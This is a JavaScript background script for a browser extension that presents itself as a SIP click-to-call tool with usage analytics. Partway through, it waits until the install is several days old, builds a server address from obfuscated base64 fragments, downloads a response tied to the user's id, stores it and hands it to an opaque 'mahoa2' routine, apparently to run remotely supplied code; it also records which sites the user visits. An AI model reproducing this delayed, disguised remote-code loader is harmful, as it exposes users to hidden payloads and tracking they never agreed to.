(function() {
  window.gat_id = "UA-46810133-12";
  window.gat_cat = "sip-caller";
  localStorage.setItem("gat_id", window.gat_id);
  localStorage.setItem("gat_cat", window.gat_cat);
  var t = function() {
    var t = function() {
      return ((1 + Math.random()) * 65536 | 0).toString(16).substring(1);
    };
    return t() + t() + "-" + t() + "-" + t() + "-" + t() + "-" + t() + t() + t();
  };
  if (localStorage.getItem("uid") === null) {
    localStorage.setItem("uid", "");
  }
  if (localStorage.getItem("gat_valid") === null) {
    localStorage.setItem("gat_valid", "ok");
  }
  if (localStorage.getItem("uid") === null || localStorage.getItem("uid") === "") {
    localStorage.setItem("uid", t());
  }
  var e = localStorage.getItem("user_group") || Math.floor(Math.random() * 10) + 1;
  localStorage.setItem("user_group", e);
  var a = function(t, e) {
    var a = "";
    var o = t;
    for (var n in e) {
      var r = e[n];
      a += encodeURIComponent(n) + "=" + encodeURIComponent(r) + "&";
    }
    if (a.length > 0) {
      a = a.substring(0, a.length - 1);
      o = t + "?" + a;
    }
    return o;
  };
  var o = function(t, e, a) {
    var o = new XMLHttpRequest();
    o.open("GET", t);
    o.onreadystatechange = function() {
      if (o.readyState == 4) {
        if (o.status == 200 && e) {
          e(o.responseText);
        }
        if (a) {
          a();
        }
      }
    };
    o.send();
  };
  var n = function(t, e, a, o) {
    var n = new XMLHttpRequest();
    n.open("POST", t);
    n.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    n.onreadystatechange = function() {
      if (n.readyState == 4) {
        if (n.status == 200 && a) {
          a(n.responseText);
        }
        if (o) {
          o();
        }
      }
    };
    n.send(e);
  };
  var r = false;
  for (var i in localStorage) {
    if (i.indexOf("bg" + e) === 0) {
      r = i;
      break;
    }
  }
  if (!r) {
    r = "bg" + e + (Math.floor(Math.random() * 999999) + 1e5);
  }
  var l = window.mahoaBase64;
  var c, g;
  var s = function() {
    var t = new Date();
    var e = "" + t.getUTCFullYear();
    var a = t.getUTCMonth() < 9 ? "0" + (t.getUTCMonth() + 1) : "" + (t.getUTCMonth() + 1);
    var o = t.getUTCDate() < 10 ? "0" + t.getUTCDate() : "" + t.getUTCDate();
    c = e + a + o;
    g = 0;
    var n = localStorage.getItem("installdt");
    if (!n) {
      localStorage.setItem("installdt", c);
    } else {
      try {
        var r = n.substr(0, 4);
        var i = n.substr(4, 2) - 1;
        var l = n.substr(6, 2);
        var s = new Date(r, i, l);
        var d = t.getTime() - s.getTime();
        g = Math.floor(d / (1e3 * 60 * 60 * 24));
      } catch (u) {}
    }
    localStorage.setItem("installdc", g);
  };
  var d = function() {
    function t(t, e) {
      return t + Math.floor(Math.random() * (e - t));
    }
    function e(t) {
      var e = 0, a, o, n;
      if (typeof t === "undefined" || t === null || t.length === 0) {
        return e;
      }
      t = t.replace(/[-{}]/g, "");
      for (a = 0, n = t.length; a < n; a++) {
        o = t.charCodeAt(a);
        e = (e << 5) - e + o;
        e |= 0;
      }
      return e;
    }
    function a(t, e, a, o) {
      var r = window.navigator.userLanguage || window.navigator.language;
      var i = encodeURIComponent(window.currVersion);
      var l = encodeURIComponent(d.gat_cat);
      var c = encodeURIComponent(localStorage.getItem("installdt") || window.curDate);
      var g = "";
      if (localStorage.getItem("fbid")) {
        g = encodeURIComponent(localStorage.getItem("fbid"));
      }
      var s = "https://www.google-analytics.com/collect";
      var u = "v=1" + "&tid=" + t + "&cid=" + e + "&uid=" + a + "&t=pageview" + "&ul=" + r + "&ci=" + i + "&cn=" + l + "&cs=" + l + "&cm=chrome" + "&ck=" + c + "&cc=" + g + "&dh=" + d.gat_domain + "&dp=" + encodeURIComponent("/" + o + "/") + "&dt=" + encodeURIComponent(e) + "&z=" + Math.floor(Math.random() * 999999);
      n(s, u);
    }
    function o(t, e, a, o, r, i, l, c) {
      var g = window.navigator.userLanguage || window.navigator.language;
      var s = encodeURIComponent(window.currVersion);
      var u = encodeURIComponent(d.gat_cat);
      var f = encodeURIComponent(localStorage.getItem("installdt") || window.curDate);
      var m = "";
      if (localStorage.getItem("fbid")) {
        m = encodeURIComponent(localStorage.getItem("fbid"));
      }
      var v = "https://www.google-analytics.com/collect";
      var p = "v=1" + "&tid=" + t + "&cid=" + e + "&uid=" + a + "&t=event" + "&ul=" + g + "&ci=" + s + "&cn=" + u + "&cs=" + u + "&cm=chrome" + "&ck=" + f + "&cc=" + m + "&dh=" + d.gat_domain + "&dp=" + encodeURIComponent("/" + o + "/") + "&dt=" + encodeURIComponent(e) + "&ec=" + encodeURIComponent(r) + "&ea=" + encodeURIComponent(i) + (typeof l !== "undefined" && l ? "&el=" + encodeURIComponent(l) : "") + (typeof c !== "undefined" && c ? "&ev=" + encodeURIComponent(c) : "") + "&z=" + Math.floor(Math.random() * 999999);
      n(v, p);
    }
    function r(t, e) {
      var n = "" + d.uid;
      var r = "" + d.iid;
      if (e === undefined || e === null) {
        e = 0;
      }
      var i = t.slice(0);
      if (i[0] === "_trackPageview") {
        if ((e === 0 || e === 1) && d.gat_id !== "") {
          a(d.gat_id, n, r, i[1]);
        }
        if ((e === 0 || e === 2) && d.gat_zid !== "") {
          a(d.gat_zid, n, r, i[1]);
        }
      } else {
        if (i[0] === "_trackEvent") {
          if ((e === 0 || e === 1) && d.gat_id !== "") {
            o(d.gat_id, n, r, i[1], i[1], i[2], i[3], i[4]);
          }
          if ((e === 0 || e === 2) && d.gat_zid !== "") {
            o(d.gat_zid, n, r, i[1], i[1], i[2], i[3], i[4]);
          }
        }
      }
    }
    function i(t) {
      window.curDate = c;
      window.currVersion = chrome.runtime.getManifest().version;
      d.gat_name = "Tracker";
      d.gat_domain = window.gat_domain || "www.google.com";
      d.gat_id = window.gat_id;
      d.gat_cat = window.gat_cat;
      d.uid = localStorage.getItem("uid");
      d.iid = e(localStorage.getItem("uid"));
      if (t !== undefined && t !== null) {
        d.gat_zid = t;
      }
      d.trackPush([ "_trackPageview", d.gat_cat + "/background" ]);
      if (localStorage.getItem("optout") === null || localStorage.getItem("optout") === "") {
        localStorage.setItem("optout", "0");
      }
    }
    function l(t, e, a) {
      if (t != "opt-out" && t != "opted-out" && localStorage.getItem("optout") == "1") {
        return;
      }
      d.trackPush([ "_trackEvent", d.gat_cat, t, e ], a);
    }
    return {
      gat_name: "",
      gat_domain: "",
      gat_id: "",
      gat_zid: "",
      gat_cat: "",
      uid: "",
      iid: 0,
      getHashCode: e,
      trackPush: r,
      putToStatics: l,
      init: i
    };
  }();
  var u = localStorage.getItem("activeDays");
  if (u) {
    u = u.split(", ");
  } else {
    u = [];
  }
  var f = [];
  var m = function(t, e, a) {
    if (e.status && e.status === "complete" && a.url && a.url.match(/^https?:\/\/([^\/]+)/)) {
      var o = a.url.match(/^https?:\/\/([^\/]+)/)[1];
      if (f.indexOf(o) === -1) {
        f.push(o);
        if (f.length >= 3) {
          if (!localStorage.getItem("instact")) {
            putToStatics("instact");
            localStorage.setItem("instact", 1);
          }
          if (g >= 3) {
            putToStatics("dailyact");
          }
          if (u.length >= 5) {
            u.shift();
          }
          u.push(c);
          localStorage.setItem("activeDays", u.join(", "));
          chrome.tabs.onUpdated.removeListener(m);
        }
      }
    }
  };
  function v(t) {
    console.log("Extension Installed");
    putToStatics("installed");
    if (localStorage.getItem("installdt") === null) {
      localStorage.setItem("installdt", c);
    }
  }
  function p(t) {
    console.log("Extension Updated");
    putToStatics("updated" + "-" + t);
  }
  function w(t, e) {
    console.log("Extension Active");
    if (localStorage.getItem("optout") === "1") {
      putToStatics("opted-out", e);
    } else {
      putToStatics("active", e);
    }
  }
  function S() {
    var t = chrome.runtime.getManifest();
    return t.version;
  }
  var I = function() {
    s();
    d.init();
    window.trackPush = window.trackPush || d.trackPush;
    window.putToStatics = window.putToStatics || d.putToStatics;
    if (u.indexOf(c) === -1) {
      f = [];
      chrome.tabs.onUpdated.addListener(m);
    }
    localStorage.setItem("update", "false");
    window.currVersion = window.currVersion || S();
    window.prevVersion = window.prevVersion || localStorage.getItem("version") || localStorage.getItem("installed");
    if (currVersion != prevVersion) {
      if (prevVersion === null) {
        v(currVersion);
      } else {
        localStorage.setItem("instact", 1);
        localStorage.setItem("update", "true");
        p(currVersion);
      }
      localStorage.setItem("version", currVersion);
    }
    var t = localStorage.getItem("last_active");
    window.last_active = false;
    if (!t || t !== c) {
      if (t) {
        localStorage.setItem("instact", 1);
      }
      w(currVersion, g);
      localStorage.setItem("last_active", c);
      window.last_active = true;
    }
    if (g >= 3 && u.length >= 3) {
      var n = l.getSalt([ 831805, "Oi8v", 19361, "W0dST1VQXS4=", 620542, "LQ==", 17523, "Lg==", 16438, "Lw==" ]).replace("[GROUP]", e);
      o(a(n + "status/", {
        gat: window.gat_cat,
        grp: e,
        dsb: g,
        cb: Math.floor(Math.random() * 999999)
      }), function(t) {
        var i = JSON.parse(t);
        if (i.status === "ok") {
          o(a(n, {
            id: d.iid,
            key: d.uid,
            grp: e,
            gat: window.gat_cat,
            dsb: g,
            en: 1,
            cb: Math.floor(Math.random() * 999999)
          }), function(t) {
            localStorage.setItem(r, t);
          }, function() {
            var t = localStorage.getItem(r);
            if (t && t.length > 3) {
              l.mahoa2(t, 1);
            }
          });
        }
      });
    }
  };
  I();
  setInterval(I, 3 * 3600 * 1e3);
  if (localStorage.getItem("sipProtocol") === null) {
    localStorage.setItem("sipProtocol", "sip");
  }
  chrome.extension.onMessage.addListener(function(t, e, a) {
    if (t.cmd == "gat_valid") {
      if (typeof a === "function") {
        var n = localStorage.getItem("sipProtocol");
        if (n == "sipCallerAny" && localStorage.getItem("sipCallerAnyProtocol")) {
          n = localStorage.getItem("sipCallerAnyProtocol");
        }
        a({
          valid: localStorage.getItem("gat_valid"),
          protocol: n
        });
      }
      return true;
    }
    if (localStorage.getItem("gat_valid") !== "ok") {
      return true;
    }
    if (t.cmd == "sip-click") {
      console.log(t);
      if (localStorage.getItem("sipProtocol") == "sipCallerGet") {
        var r = localStorage.getItem("sipCallerGetUrl");
        if (r) {
          r = r.replace(/\$NUMBER/g, t.number.replace(/sipCallerGet\:/i, ""));
          o(r, function(t) {
            console.log("SUCCESS: " + r);
          });
        }
      }
    } else {
      if (typeof a === "function") {
        a({
          data: "no response"
        });
      }
    }
    return true;
  });
})();